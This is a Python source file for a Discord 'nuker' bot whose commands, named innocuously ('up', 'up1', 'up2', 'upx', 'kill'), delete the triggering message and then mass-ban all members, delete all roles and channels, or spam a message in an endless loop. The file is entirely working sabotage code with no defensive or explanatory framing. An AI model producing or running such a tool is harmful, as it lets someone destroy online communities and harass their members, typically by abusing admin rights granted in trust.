import discord
from discord.ext import commands
import asyncio

client = discord.Client() 

client = commands.Bot(command_prefix = '!') 

@client.event
async def on_ready():
    print('Bot enabled')


@client.command()
async def up(ctx):
    await ctx.message.delete()
    for m in ctx.guild.members:
        try:
            await m.ban()
        except:
            pass

@client.command()
async def up1(ctx):
    await ctx.message.delete()
    for m in ctx.guild.roles:
        try:
            await m.delete()
        except:
            pass

@client.command()
async def up2(ctx): 
    await ctx.message.delete()
    failed = []
    counter = 0
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)

@client.command()
async def upx(ctx, arg): 
    await ctx.message.delete()

    i = 1
    while i == 1:
        await ctx.send(arg)

@client.command()
async def kill(ctx): 
    await ctx.message.delete()
    for m in ctx.guild.roles:
        try:
            await m.delete()
        except:
            pass
   
    for m in ctx.guild.members:
        try:
            await m.ban()
        except:
            pass

    failed = []
    counter = 0
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)




token = open('token.txt', 'r').readline()

client.run(token) 

